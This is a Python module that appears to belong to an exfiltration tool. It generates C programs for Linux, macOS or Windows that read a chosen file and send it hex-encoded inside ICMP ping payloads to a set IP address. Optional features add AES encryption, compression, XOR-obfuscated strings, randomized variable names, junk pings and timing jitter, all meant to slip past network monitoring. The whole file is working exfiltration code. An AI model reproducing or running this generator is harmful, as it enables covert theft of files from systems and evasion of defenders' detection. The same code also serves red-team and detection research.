import random

from ..obfuscation import xor_key, xor_encode


def _c_payload(file_path, ip, period, random_delay, target_os, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    c_file = file_path.replace("\\", "\\\\").replace('"', '\\"')

    includes = ['<stdio.h>', '<stdlib.h>', '<string.h>', '<stdint.h>', '<math.h>', '<time.h>']
    if target_os in ("linux", "macos"):
        includes.append('<unistd.h>')
    if target_os == "windows":
        includes.extend(['<winsock2.h>', '<windows.h>', '<iphlpapi.h>', '<icmpapi.h>'])
    if compress:
        includes.append('<zlib.h>')
    include_block = "\n".join("#include " + inc for inc in includes)

    sha256_impl = """
static const uint32_t K256[64]={
\t0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
\t0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
\t0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
\t0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
\t0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
\t0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
\t0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
\t0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};
#define RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define EP0(x) (RR(x,2)^RR(x,13)^RR(x,22))
#define EP1(x) (RR(x,6)^RR(x,11)^RR(x,25))
#define SG0(x) (RR(x,7)^RR(x,18)^((x)>>3))
#define SG1(x) (RR(x,17)^RR(x,19)^((x)>>10))
void sha256(const uint8_t *msg,size_t len,uint8_t out[32]){
\tuint32_t h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a;
\tuint32_t h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;
\tsize_t ml=len*8,pad=((len+8)/64+1)*64;
\tuint8_t *buf=(uint8_t*)calloc(pad,1);
\tmemcpy(buf,msg,len);buf[len]=0x80;
\tfor(int qi=0;qi<8;qi++)buf[pad-1-qi]=(uint8_t)((ml>>(qi*8))&0xff);
\tfor(size_t bl=0;bl<pad;bl+=64){
\t\tuint32_t w[64];
\t\tfor(int qi=0;qi<16;qi++)w[qi]=((uint32_t)buf[bl+qi*4]<<24)|((uint32_t)buf[bl+qi*4+1]<<16)|((uint32_t)buf[bl+qi*4+2]<<8)|buf[bl+qi*4+3];
\t\tfor(int qi=16;qi<64;qi++)w[qi]=SG1(w[qi-2])+w[qi-7]+SG0(w[qi-15])+w[qi-16];
\t\tuint32_t sa=h0,sb=h1,sc=h2,sd=h3,se=h4,sf=h5,sg=h6,sh=h7;
\t\tfor(int qi=0;qi<64;qi++){
\t\t\tuint32_t t1=sh+EP1(se)+CH(se,sf,sg)+K256[qi]+w[qi];
\t\t\tuint32_t t2=EP0(sa)+MJ(sa,sb,sc);
\t\t\tsh=sg;sg=sf;sf=se;se=sd+t1;sd=sc;sc=sb;sb=sa;sa=t1+t2;
\t\t}
\t\th0+=sa;h1+=sb;h2+=sc;h3+=sd;h4+=se;h5+=sf;h6+=sg;h7+=sh;
\t}
\tfree(buf);
\tuint32_t hs[8]={h0,h1,h2,h3,h4,h5,h6,h7};
\tfor(int qi=0;qi<8;qi++){out[qi*4]=(uint8_t)(hs[qi]>>24);out[qi*4+1]=(uint8_t)((hs[qi]>>16)&0xff);out[qi*4+2]=(uint8_t)((hs[qi]>>8)&0xff);out[qi*4+3]=(uint8_t)(hs[qi]&0xff);}
}
"""

    crypto_impl = ""
    if encrypt:
        crypto_impl = """
static const uint8_t SBOX[256]={
\t0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
\t0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
\t0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
\t0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
\t0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
\t0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
\t0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
\t0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
\t0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
\t0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
\t0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
\t0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
\t0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
\t0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
\t0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
\t0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};
static uint8_t gmul(uint8_t xa,uint8_t xb){
\tuint8_t xp=0;
\tfor(int qi=0;qi<8;qi++){
\t\tif(xb&1)xp^=xa;
\t\tuint8_t hi=xa&0x80;xa<<=1;if(hi)xa^=0x1b;xb>>=1;
\t}
\treturn xp;
}
void aes_exp(const uint8_t *key,int kl,uint32_t *rk,int *nr){
\t*nr=kl/4+6;int nk=kl/4;
\tfor(int qi=0;qi<nk;qi++)rk[qi]=((uint32_t)key[4*qi]<<24)|((uint32_t)key[4*qi+1]<<16)|((uint32_t)key[4*qi+2]<<8)|key[4*qi+3];
\tuint8_t rc=1;
\tfor(int qi=nk;qi<4*(*nr+1);qi++){
\t\tuint32_t xt=rk[qi-1];
\t\tif(qi%nk==0){
\t\t\txt=((uint32_t)SBOX[(xt>>16)&0xff]<<24)|((uint32_t)SBOX[(xt>>8)&0xff]<<16)|((uint32_t)SBOX[xt&0xff]<<8)|SBOX[xt>>24];
\t\t\txt^=(uint32_t)rc<<24;rc=(rc<<1)^((rc&0x80)?0x1b:0);
\t\t}else if(nk>6&&qi%nk==4){
\t\t\txt=((uint32_t)SBOX[xt>>24]<<24)|((uint32_t)SBOX[(xt>>16)&0xff]<<16)|((uint32_t)SBOX[(xt>>8)&0xff]<<8)|SBOX[xt&0xff];
\t\t}
\t\trk[qi]=rk[qi-nk]^xt;
\t}
}
void aes_enc(const uint8_t *in,uint8_t *out,const uint32_t *rk,int nr){
\tuint8_t xs[16];memcpy(xs,in,16);
\tfor(int qi=0;qi<4;qi++){xs[4*qi]^=(uint8_t)(rk[qi]>>24);xs[4*qi+1]^=(uint8_t)((rk[qi]>>16)&0xff);xs[4*qi+2]^=(uint8_t)((rk[qi]>>8)&0xff);xs[4*qi+3]^=(uint8_t)(rk[qi]&0xff);}
\tfor(int xr=1;xr<=nr;xr++){
\t\tfor(int qi=0;qi<16;qi++)xs[qi]=SBOX[xs[qi]];
\t\tuint8_t xt;
\t\txt=xs[1];xs[1]=xs[5];xs[5]=xs[9];xs[9]=xs[13];xs[13]=xt;
\t\txt=xs[2];xs[2]=xs[10];xs[10]=xt;xt=xs[6];xs[6]=xs[14];xs[14]=xt;
\t\txt=xs[15];xs[15]=xs[11];xs[11]=xs[7];xs[7]=xs[3];xs[3]=xt;
\t\tif(xr<nr){
\t\t\tfor(int qi=0;qi<4;qi++){
\t\t\t\tuint8_t a0=xs[4*qi],a1=xs[4*qi+1],a2=xs[4*qi+2],a3=xs[4*qi+3];
\t\t\t\txs[4*qi]=gmul(a0,2)^gmul(a1,3)^a2^a3;
\t\t\t\txs[4*qi+1]=a0^gmul(a1,2)^gmul(a2,3)^a3;
\t\t\t\txs[4*qi+2]=a0^a1^gmul(a2,2)^gmul(a3,3);
\t\t\t\txs[4*qi+3]=gmul(a0,3)^a1^a2^gmul(a3,2);
\t\t\t}
\t\t}
\t\tfor(int qi=0;qi<4;qi++){xs[4*qi]^=(uint8_t)(rk[4*xr+qi]>>24);xs[4*qi+1]^=(uint8_t)((rk[4*xr+qi]>>16)&0xff);xs[4*qi+2]^=(uint8_t)((rk[4*xr+qi]>>8)&0xff);xs[4*qi+3]^=(uint8_t)(rk[4*xr+qi]&0xff);}
\t}
\tmemcpy(out,xs,16);
}
void aes_cbc(const uint8_t *in,size_t len,const uint8_t *key,int kl,const uint8_t *iv,uint8_t *out){
\tuint32_t rk[60];int nr;
\taes_exp(key,kl,rk,&nr);
\tuint8_t pv[16];memcpy(pv,iv,16);
\tfor(size_t xo=0;xo<len;xo+=16){
\t\tuint8_t xb[16];
\t\tfor(int qi=0;qi<16;qi++)xb[qi]=in[xo+qi]^pv[qi];
\t\taes_enc(xb,out+xo,rk,nr);
\t\tmemcpy(pv,out+xo,16);
\t}
}
void hmac256(const uint8_t *key,size_t kl,const uint8_t *msg,size_t ml,uint8_t out[32]){
\tuint8_t kk[64];memset(kk,0,64);
\tif(kl>64)sha256(key,kl,kk);else memcpy(kk,key,kl);
\tuint8_t xip[64],xop[64];
\tfor(int qi=0;qi<64;qi++){xip[qi]=kk[qi]^0x36;xop[qi]=kk[qi]^0x5c;}
\tuint8_t *im=(uint8_t*)malloc(64+ml);
\tmemcpy(im,xip,64);memcpy(im+64,msg,ml);
\tuint8_t ih[32];sha256(im,64+ml,ih);free(im);
\tuint8_t om[96];memcpy(om,xop,64);memcpy(om+64,ih,32);
\tsha256(om,96,out);
}
void kdf(const uint8_t *pw,size_t pl,const uint8_t *sa,size_t sl,int it,uint8_t *dk,int dl){
\tint nb=(dl+31)/32;
\tfor(int bi=1;bi<=nb;bi++){
\t\tuint8_t *xm=(uint8_t*)malloc(sl+4);
\t\tmemcpy(xm,sa,sl);
\t\txm[sl]=(uint8_t)((bi>>24)&0xff);xm[sl+1]=(uint8_t)((bi>>16)&0xff);xm[sl+2]=(uint8_t)((bi>>8)&0xff);xm[sl+3]=(uint8_t)(bi&0xff);
\t\tuint8_t xu[32],xt[32];
\t\thmac256(pw,pl,xm,sl+4,xu);free(xm);
\t\tmemcpy(xt,xu,32);
\t\tfor(int ji=1;ji<it;ji++){
\t\t\thmac256(pw,pl,xu,32,xu);
\t\t\tfor(int ki=0;ki<32;ki++)xt[ki]^=xu[ki];
\t\t}
\t\tint cl=32;if((bi-1)*32+cl>dl)cl=dl-(bi-1)*32;
\t\tmemcpy(dk+(bi-1)*32,xt,cl);
\t}
}
"""

    if target_os == "linux":
        platform_code = """
int sendPing(const char *ip, const char *pat, int sz, int timeout) {
\tchar cmd[512];
\tsnprintf(cmd, sizeof(cmd), "ping -c 1 -W %d -s %d -p %s %s > /dev/null 2>&1", timeout, sz, pat, ip);
\treturn system(cmd) == 0;
}
void msleep(double sec) { usleep((useconds_t)(sec * 1000000)); }
"""
    elif target_os == "macos":
        platform_code = """
int sendPing(const char *ip, const char *pat, int sz, int timeout) {
\tchar cmd[512];
\tsnprintf(cmd, sizeof(cmd), "ping -c 1 -W %d -s %d -p %s %s > /dev/null 2>&1", timeout * 1000, sz, pat, ip);
\treturn system(cmd) == 0;
}
void msleep(double sec) { usleep((useconds_t)(sec * 1000000)); }
"""
    else:
        platform_code = """
int htob(const char *hx, uint8_t *bn, int mx) {
\tint ln = 0;
\twhile (*hx && *(hx+1) && ln < mx) {
\t\tchar hc[3] = {hx[0], hx[1], 0};
\t\tbn[ln++] = (uint8_t)strtol(hc, NULL, 16);
\t\thx += 2;
\t}
\treturn ln;
}
int sendPing(const char *ip, const char *pat, int sz, int timeout) {
\tuint8_t pb[32];
\tint pl = htob(pat, pb, sizeof(pb));
\tHANDLE hd = IcmpCreateFile();
\tif (hd == INVALID_HANDLE_VALUE) return 0;
\tunsigned long ad = inet_addr(ip);
\tchar rby[288];
\tDWORD rt = IcmpSendEcho(hd, ad, pb, (WORD)pl, NULL, rby, sizeof(rby), (DWORD)(timeout * 1000));
\tIcmpCloseHandle(hd);
\treturn rt > 0;
}
void msleep(double sec) { Sleep((DWORD)(sec * 1000)); }
"""

    helpers = sha256_impl + crypto_impl + platform_code

    key = None
    if obfuscate_strings:
        key = xor_key()
        key_str = ','.join(str(b) for b in key)
        helpers += (
            'char *_d(const char *h, const unsigned char *k, int kl) {\n'
            '\tint hl = (int)strlen(h);\n'
            '\tint bl = hl / 2;\n'
            '\tchar *r = (char *)malloc(bl + 1);\n'
            '\tfor (int qi = 0; qi < bl; qi++) {\n'
            '\t\tchar hc[3] = {h[qi*2], h[qi*2+1], 0};\n'
            '\t\tr[qi] = (char)(strtol(hc, NULL, 16) ^ k[qi % kl]);\n'
            '\t}\n'
            '\tr[bl] = 0;\n'
            '\treturn r;\n'
            '}\n'
        )

    template = """__INCLUDES__
__HELPERS__
int main(void) {
\tconst char *f = "__FILE__";
\tconst char *ip = "__IP__";
\tdouble p = __PERIOD__;
\tdouble rd = __RDELAY__;
\tint c = 12;
\tint ib = 3;
\tint r = 5;
\tint t = 2;
\tFILE *fp = fopen(f, "rb");
\tif (!fp) { fprintf(stderr, "[-] Cannot read file: %s\\n", f); return 1; }
\tfseek(fp, 0, SEEK_END);
\tlong fsz = ftell(fp);
\tfseek(fp, 0, SEEK_SET);
\tuint8_t *data = (uint8_t *)malloc((size_t)fsz);
\tfread(data, 1, (size_t)fsz, fp);
\tfclose(fp);
\tlong dsz = fsz;
\tuint8_t hv[32];
\tsha256(data, (size_t)dsz, hv);
\tchar hsh[65];
\tfor (int qi = 0; qi < 32; qi++) sprintf(hsh + qi*2, "%02x", hv[qi]);
\thsh[64] = 0;
\tchar *hx = (char *)malloc((size_t)(dsz * 2 + 1));
\tfor (long qi = 0; qi < dsz; qi++) sprintf(hx + qi*2, "%02x", data[qi]);
\thx[dsz*2] = 0;
\tint tot = (int)ceil((double)dsz / c);
\tif (tot > (1 << (8*ib))) { fprintf(stderr, "[-] File too large\\n"); free(data); free(hx); return 1; }
\tif (rd != 0)
\t\tprintf("[+] Sending '%s' (%ld bytes) to '%s' in %d pings every (%g +- %g) s\\n", f, dsz, ip, tot, p, rd);
\telse if (p != 0)
\t\tprintf("[+] Sending '%s' (%ld bytes) to '%s' in %d pings every %g s\\n", f, dsz, ip, tot, p);
\telse
\t\tprintf("[+] Sending '%s' (%ld bytes) to '%s' in %d pings\\n", f, dsz, ip, tot);
\tif (rd > p) fprintf(stderr, "[!] WARNING: random-delay (%g s) > period (%g s)\\n", rd, p);
\tint ls = 0;
\ttime_t t0 = time(NULL);
\tsrand((unsigned)time(NULL));
\tfor (int i = 0; i < tot; i++) {
\t\tchar idx[7];
\t\tsnprintf(idx, sizeof(idx), "%06x", i);
\t\tint st = i * 24;
\t\tint en = st + 24;
\t\tif (en > (int)(dsz * 2)) en = (int)(dsz * 2);
\t\tchar pat[31];
\t\tmemcpy(pat, idx, 6);
\t\tmemcpy(pat + 6, hx + st, en - st);
\t\tpat[6 + en - st] = 0;
\t\tint ok = 0;
\t\tfor (int a = 0; a < r; a++) {
\t\t\tif (ls) {
\t\t\t\tif (rd != 0) {
\t\t\t\t\tdouble sl = p + ((double)rand()/RAND_MAX * 2 - 1) * rd;
\t\t\t\t\tif (sl < 0) sl = 0;
\t\t\t\t\tmsleep(sl);
\t\t\t\t} else if (p != 0) {
\t\t\t\t\tmsleep(p);
\t\t\t\t}
\t\t\t}
\t\t\tls = 1;
\t\t\tint sz = (int)strlen(pat) / 2;
\t\t\tif (sendPing(ip, pat, sz, t)) {
\t\t\t\tok = 1;
\t\t\t\tbreak;
\t\t\t}
\t\t}
\t\tif (!ok) {
\t\t\tfprintf(stderr, "[-] No reply for ping %d, transfer aborted\\n", i);
\t\t\tfree(data); free(hx);
\t\t\treturn 1;
\t\t}
\t\tint sn = i + 1;
\t\tif (p != 0 || rd != 0) {
\t\t\tdouble el = difftime(time(NULL), t0);
\t\t\tint eh = (int)el / 3600;
\t\t\tint em = (int)el % 3600 / 60;
\t\t\tint es = (int)el % 60;
\t\t\tint by = sn * c;
\t\t\tif (by > (int)dsz) by = (int)dsz;
\t\t\tint pct = 100 * sn / tot;
\t\t\tprintf("\\r  %d/%d pings, %d/%d bytes, %d%%, elapsed %02d:%02d:%02d", sn, tot, by, (int)dsz, pct, eh, em, es);
\t\t\tif (rd == 0 && sn > 0) {
\t\t\t\tint rm = (int)(el * (tot - sn) / sn);
\t\t\t\tint rh = rm / 3600;
\t\t\t\tint rmm = rm % 3600 / 60;
\t\t\t\tint rss = rm % 60;
\t\t\t\tprintf(", remaining ~%02d:%02d:%02d", rh, rmm, rss);
\t\t\t}
\t\t\tfflush(stdout);
\t\t} else if (sn % 100 == 0) {
\t\t\tprintf("  %d/%d\\n", sn, tot);
\t\t}
\t}
\tprintf("\\n");
\tprintf("==================================================\\n");
\tprintf("                     DONE\\n");
\tprintf("==================================================\\n\\n");
\tprintf("[*] SHA-256: %s\\n", hsh);
\tfree(data);
\tfree(hx);
\treturn 0;
}
"""

    script = template.replace('__INCLUDES__', include_block).replace('__HELPERS__', helpers)

    if obfuscate_strings:
        script = script.replace(
            '\tconst char *f = "__FILE__";\n\tconst char *ip = "__IP__";',
            f'\tunsigned char _k[] = {{{key_str}}};\n\tchar *f = _d("__XFILE__", _k, sizeof(_k));\n\tchar *ip = _d("__XIP__", _k, sizeof(_k));'
        )

    if compress:
        compress_code = (
            "\tlong osz = dsz;\n"
            "\tuLongf csz = compressBound((uLong)dsz);\n"
            "\tuint8_t *comp = (uint8_t *)malloc(csz);\n"
            "\tz_stream strm;\n"
            "\tmemset(&strm, 0, sizeof(strm));\n"
            "\tdeflateInit2(&strm, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15+16, 8, Z_DEFAULT_STRATEGY);\n"
            "\tstrm.avail_in = (uInt)dsz;\n"
            "\tstrm.next_in = data;\n"
            "\tstrm.avail_out = (uInt)csz;\n"
            "\tstrm.next_out = comp;\n"
            "\tdeflate(&strm, Z_FINISH);\n"
            "\tcsz = (long)strm.total_out;\n"
            "\tdeflateEnd(&strm);\n"
            "\tprintf(\"[*] Compressed: %ld -> %ld bytes (%.1f%%)\\n\", osz, (long)csz, 100.0*(double)csz/(double)osz);\n"
            "\tfree(data);\n"
            "\tdata = comp;\n"
            "\tdsz = (long)csz;\n"
        )
        script = script.replace(
            "\tchar *hx = (char *)malloc((size_t)(dsz * 2 + 1));\n",
            compress_code + "\tchar *hx = (char *)malloc((size_t)(dsz * 2 + 1));\n"
        )

    if encrypt:
        c_pass = passphrase.replace("\\", "\\\\").replace('"', '\\"')
        cipher_parts = encrypt.split('-')
        key_size = int(cipher_parts[1]) // 8
        encrypt_code = (
            "\tconst char *pp = \"__PP_VALUE__\";\n"
            "\tuint8_t esl[8];\n"
            "\tfor (int qi = 0; qi < 8; qi++) esl[qi] = (uint8_t)(rand() & 0xff);\n"
            f"\tuint8_t edk[{key_size + 16}];\n"
            f"\tkdf((const uint8_t *)pp, strlen(pp), esl, 8, 10000, edk, {key_size + 16});\n"
            "\tint epd = 16 - (int)(dsz % 16);\n"
            "\tdata = (uint8_t *)realloc(data, (size_t)(dsz + epd));\n"
            "\tmemset(data + dsz, epd, (size_t)epd);\n"
            "\tdsz += epd;\n"
            "\tuint8_t *ect = (uint8_t *)malloc((size_t)dsz);\n"
            f"\taes_cbc(data, (size_t)dsz, edk, {key_size}, edk + {key_size}, ect);\n"
            "\tuint8_t *enc = (uint8_t *)malloc((size_t)(16 + dsz));\n"
            "\tmemcpy(enc, \"Salted__\", 8);\n"
            "\tmemcpy(enc + 8, esl, 8);\n"
            "\tmemcpy(enc + 16, ect, (size_t)dsz);\n"
            "\tfree(data); free(ect);\n"
            "\tdata = enc;\n"
            "\tdsz = 16 + dsz;\n"
            f"\tprintf(\"[*] Encrypted with {encrypt}\\n\");\n"
        )
        if obfuscate_strings:
            encrypt_code = encrypt_code.replace(
                '\tconst char *pp = "__PP_VALUE__";\n',
                '\tchar *pp = _d("__XPP__", _k, sizeof(_k));\n'
            )
        script = script.replace(
            "\tchar *hx = (char *)malloc((size_t)(dsz * 2 + 1));\n",
            encrypt_code + "\tchar *hx = (char *)malloc((size_t)(dsz * 2 + 1));\n"
        )

    if junk > 0:
        script = script.replace(
            "\tint c = 12;\n",
            f"\tint c = 12;\n\tint J = {junk};\n"
        )
        if randomize_junk:
            jb_size = 14
            junk_prefix = "ff"
            prefix_len = 2
        else:
            jb_size = 12
            junk_prefix = "ffffff"
            prefix_len = 6
        junk_code = (
            "\t\tfor (int j = 0; j < J; j++) {\n"
            f"\t\t\tuint8_t jb[{jb_size}];\n"
            f"\t\t\tfor (int qi = 0; qi < {jb_size}; qi++) jb[qi] = (uint8_t)(rand() & 0xff);\n"
            "\t\t\tchar jd[31];\n"
            f"\t\t\tstrcpy(jd, \"{junk_prefix}\");\n"
            f"\t\t\tfor (int qi = 0; qi < {jb_size}; qi++) sprintf(jd + {prefix_len} + qi*2, \"%02x\", jb[qi]);\n"
            "\t\t\tif (ls) {\n"
            "\t\t\t\tif (rd != 0) {\n"
            "\t\t\t\t\tdouble sl = p + ((double)rand()/RAND_MAX * 2 - 1) * rd;\n"
            "\t\t\t\t\tif (sl < 0) sl = 0;\n"
            "\t\t\t\t\tmsleep(sl);\n"
            "\t\t\t\t} else if (p != 0) {\n"
            "\t\t\t\t\tmsleep(p);\n"
            "\t\t\t\t}\n"
            "\t\t\t}\n"
            "\t\t\tls = 1;\n"
            "\t\t\tsendPing(ip, jd, 15, t);\n"
            "\t\t}\n"
        )
        script = script.replace("\t\tint sn = i + 1;\n", "\t\tint sn = i + 1;\n" + junk_code)

    if estimate:
        est_lines = (
            "\tprintf(\"[!] ESTIMATE OPTION ENABLED -- the file will NOT be transferred\\n\");\n"
            "\tprintf(\"[*] File size (after processing): %ld bytes\\n\", dsz);\n"
            "\tprintf(\"[*] Data pings: %d\\n\", tot);\n"
        )
        if junk > 0:
            est_lines += (
                "\tprintf(\"[*] Junk pings: %d\\n\", tot * J);\n"
                "\tprintf(\"[*] Total pings: %d\\n\", tot * (1 + J));\n"
            )
            total_expr = "(double)(tot * (1 + J))"
        else:
            est_lines += "\tprintf(\"[*] Total pings: %d\\n\", tot);\n"
            total_expr = "(double)tot"
        est_lines += (
            "\tif (p != 0) {\n"
            "\t\tdouble et = " + total_expr + " * p;\n"
            "\t\tint hr = (int)et / 3600;\n"
            "\t\tint mn = (int)et % 3600 / 60;\n"
            "\t\tint ss = (int)et % 60;\n"
            "\t\tprintf(\"[*] Estimated time: ~%02d:%02d:%02d\\n\", hr, mn, ss);\n"
            "\t}\n"
            "\tprintf(\"[*] SHA-256: %s\\n\", hsh);\n"
            "\tfree(data); free(hx);\n"
            "\treturn 0;\n"
        )
        script = script.replace(
            "\tint ls = 0;\n\ttime_t t0 = time(NULL);\n",
            est_lines + "\tint ls = 0;\n\ttime_t t0 = time(NULL);\n"
        )

    if randomize:
        import re
        var_names = [
            'sha256', 'sendPing', 'msleep', 'timeout',
            'f', 'ip', 'p', 'rd',
            'c', 'ib', 'r', 't',
            'fp', 'fsz', 'data', 'dsz',
            'hv', 'hsh', 'hx', 'qi',
            'tot', 'ls', 't0',
            'i', 'idx', 'st', 'en', 'pat', 'ok',
            'a', 'sl', 'sz', 'sn',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if target_os in ("linux", "macos"):
            var_names.append('cmd')
        if target_os == "windows":
            var_names.extend(['htob', 'pb', 'pl', 'hd', 'ad', 'rby', 'rt'])
        if compress:
            var_names.extend(['osz', 'csz', 'strm', 'comp'])
        if encrypt:
            var_names.extend(['pp', 'kdf', 'hmac256', 'aes_exp', 'aes_enc', 'aes_cbc', 'gmul',
                              'esl', 'edk', 'epd', 'ect', 'enc'])
        if junk > 0:
            var_names.extend(['J', 'j', 'jb', 'jd'])
        if estimate:
            var_names.extend(['et', 'hr', 'mn', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_d', '_k'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        c_reserved = {'for', 'int', 'asm'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in c_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if len(old_name) == 1:
                pattern = r'(?<![-\\%])\b' + re.escape(old_name) + r'\b'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, key))
                  .replace('__XIP__', xor_encode(ip, key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, key))
    else:
        script = (script
                  .replace('__FILE__', c_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', c_pass)

    return script
